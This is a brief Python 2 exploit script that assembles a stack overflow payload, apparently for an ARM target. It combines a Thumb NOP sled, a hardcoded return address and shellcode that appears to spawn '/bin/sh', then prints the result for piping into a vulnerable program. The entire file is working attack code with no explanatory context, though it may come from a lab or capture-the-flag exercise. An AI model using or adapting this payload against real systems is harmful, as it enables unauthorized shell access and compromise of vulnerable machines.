#!/usr/bin/env python2

from __future__ import print_function
import struct

p=lambda x: struct.pack("<I",x)

offset=64
shellcode=b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41"

#print("Len Offset: %d, Len Shellcode: %d" % (offset, len(shellcode)))

#nopsled=b"\x2d\x46"*(int((offset-len(shellcode))/2))
nopsled=b"\x2d\x46"*34

#payload=+shellcode+p(0x7efff480)+p(0x7efff480+1)
payload = nopsled+p(0x76e7f5bd)+shellcode
print(payload)
